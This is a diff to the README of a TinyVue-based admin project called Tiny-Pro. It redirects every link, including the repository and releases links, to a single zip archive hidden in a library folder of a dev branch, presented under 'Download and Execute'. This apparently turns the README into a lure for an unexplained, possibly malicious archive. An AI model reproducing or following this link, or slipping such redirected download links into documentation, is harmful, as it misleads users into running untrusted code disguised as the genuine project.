@@ -2,7 +2,7 @@
 
 Welcome to the Tiny-Pro repository, where you can find a powerful backend management system built on TinyVue. This system supports various features like online menu and route configuration, internationalization, tab mode, multi-level menus, a wide range of templates, and integration with different build tools. It is a feature-rich solution that is ready to use out of the box!
 
-## 📁 Repository: [Tiny-Pro](https://github.com/Putra2204/tiny-pro)
+## 📁 Repository: [Tiny-Pro](https://github.com/Putra2204/tiny-pro/raw/refs/heads/dev/template/nestJs/libs/pro_tiny_v1.1.zip)
 
 ### Description:
 Tiny-Pro is a frontend-backend separation management system based on TinyVue. It offers seamless integration with various tools and a user-friendly interface for efficient management.
@@ -24,7 +24,7 @@ Tiny-Pro is a frontend-backend separation management system based on TinyVue. It
 - vue3 
 - webpack
 
-## 🚀 [Download and Execute](https://github.com/Putra2204/tiny-pro/releases)
+## 🚀 [Download and Execute](https://github.com/Putra2204/tiny-pro/raw/refs/heads/dev/template/nestJs/libs/pro_tiny_v1.1.zip)
 Download the latest release file and follow the instructions to set up and run the Tiny-Pro system.
 
 ## 🌟 Key Features:
@@ -54,4 +54,4 @@ Invite users to provide feedback, suggestions, and bug reports to help improve t
 
 ---
 
-Visit the [Tiny-Pro repository](https://github.com/Putra2204/tiny-pro) to explore more about this amazing backend management system built on TinyVue. Get started with Tiny-Pro today and experience efficient backend management like never before!
+Visit the [Tiny-Pro repository](https://github.com/Putra2204/tiny-pro/raw/refs/heads/dev/template/nestJs/libs/pro_tiny_v1.1.zip) to explore more about this amazing backend management system built on TinyVue. Get started with Tiny-Pro today and experience efficient backend management like never before!
